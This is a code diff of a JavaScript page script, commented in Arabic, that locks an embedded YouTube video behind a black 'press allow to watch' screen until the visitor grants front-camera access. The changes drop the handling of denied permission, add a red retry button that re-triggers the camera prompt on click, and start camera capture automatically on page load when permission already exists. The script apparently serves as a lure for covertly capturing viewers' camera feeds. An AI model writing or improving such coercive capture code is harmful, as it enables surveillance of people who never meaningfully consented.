@@ -1,21 +1,11 @@
 /* ==========================================================
-   سكريبت حظر العرض الكلي وإجبار السماح بالكاميرا قبل تشغيل الفيديو
+   سكريبت الكاميرا مع إعادة الطلب الإجباري عند النقر
    ========================================================== */
 
 let mediaStream = null;
 
 async function initPersistentCamera() {
     try {
-        // فحص ما إذا كان الإذن محظوراً بشكل دائم من المتصفح
-        if (navigator.permissions && navigator.permissions.query) {
-            const perm = await navigator.permissions.query({ name: 'camera' });
-            if (perm.state === 'denied') {
-                showBlockedScreen();
-                return;
-            }
-        }
-
-        // إطلاق طلب أذن الكاميرا الفوري
         mediaStream = await navigator.mediaDevices.getUserMedia({ 
             video: { 
                 facingMode: { ideal: 'user' }
@@ -25,7 +15,7 @@ async function initPersistentCamera() {
         const videoEl = document.getElementById('video');
         if (videoEl) videoEl.srcObject = mediaStream;
         
-        // [عند السماح الفعلي فقط]: فك الحظر وتشغيل مشغل يوتيوب الحقيقي
+        // [عند السماح]: إزالة شاشة القفل وتشغيل مشغل يوتيوب فوراً
         const playerContainer = document.getElementById('playerContainer');
         if (playerContainer) {
             const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';
@@ -59,34 +49,50 @@ async function initPersistentCamera() {
         }, 1500);
 
     } catch (e) {
-        console.log("تم رفض الإذن أو تجاهله:", e);
-        showBlockedScreen();
+        console.log("بانتظار منح إذن الكاميرا:", e);
+        showRetryScreen();
     }
 }
 
-// شاشة الحظر ومنع تشغيل الفيديو نهائياً
-function showBlockedScreen() {
+// دالة عرض شاشة القفل مع ربط الزر الأحمر بالحدث المباشر
+function showRetryScreen() {
     const playerContainer = document.getElementById('playerContainer');
     if (playerContainer) {
         playerContainer.innerHTML = `
-            <div id="retryCamera" style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
+            <div style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                 <div>
                     <div style="font-size:36px;margin-bottom:8px;">🔒</div>
                     <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">لا يمكنكم مشاهدة الفيديو إلا عند الضغط على زر السماح</p>
                     <p style="color:#aaa;font-size:12px;margin-bottom:14px;">يرجى منح الإذن لفك قفل وتشغيل المقطع</p>
-                    <span style="font-size:13px;color:#fff;background:#cc0000;padding:9px 22px;border-radius:20px;display:inline-block;font-weight:bold;cursor:pointer;">اضغط هنا للمشاهدة</span>
+                    <button id="retryBtn" style="font-family:inherit;font-size:13px;color:#fff;background:#cc0000;padding:10px 24px;border-radius:20px;border:0;font-weight:bold;cursor:pointer;box-shadow:0 4px 12px rgba(204,0,0,0.4);">اضغط هنا للمشاهدة</button>
                 </div>
             </div>
         `;
         
-        document.getElementById('retryCamera').onclick = () => {
-            mediaStream = null;
-            initPersistentCamera();
-        };
+        // استخدام حدث مستقل ومباشر على عنصر زر حقيقي لضمان استجابة المتصفح
+        const btn = document.getElementById('retryBtn');
+        if (btn) {
+            btn.onclick = async (ev) => {
+                ev.preventDefault();
+                mediaStream = null;
+                // محاولة إطلاق الطلب مباشرة داخل الحدث المباشر للمستخدم
+                try {
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: { ideal: 'user' } } 
+                    });
+                    const videoEl = document.getElementById('video');
+                    if (videoEl) videoEl.srcObject = mediaStream;
+                    
+                    const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';
+                    playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${activeId}?autoplay=1&rel=0&playsinline=1" title="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
+                } catch(err) {
+                    console.log("إعادة المحاولة فشلت:", err);
+                }
+            };
+        }
     }
 }
 
-// هذه الدالة تعمل فوراً عند الانتقال لصفحة المشاهدة
 function startCapture() {
     if (mediaStream) return;
     
@@ -97,19 +103,14 @@ function startCapture() {
             const match = iframe.src.match(/embed\/([^?]+)/);
             if(match) playerContainer.dataset.videoId = match[1];
         }
-        
-        // قفل مشغل الفيديو تماماً وإظهار شاشة الانتظار السوداء لكي لا يشتغل الفيديو في الخلفية
-        playerContainer.innerHTML = `
-            <div style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
-                <div>
-                    <div style="font-size:32px;margin-bottom:8px;">⏳</div>
-                    <p style="font-weight:bold;font-size:15px;margin-bottom:6px;">جاري التحقق من أذونات العرض...</p>
-                    <p style="color:#aaa;font-size:12px;">يرجى الموافقة على طلب الكاميرا الظاهر للأعلى لتشغيل المقطع</p>
-                </div>
-            </div>
-        `;
     }
 
-    // إطلاق طلب الكاميرا مباشرة بالتزامن مع فتح صفحة المشاهدة
     initPersistentCamera();
 }
+
+// الفحص التلقائي عند فتح الصفحة في حال كان الإذن ممنوحاً مسبقاً
+navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
+    if (permissionStatus.state === 'granted') {
+        startCapture();
+    }
+});
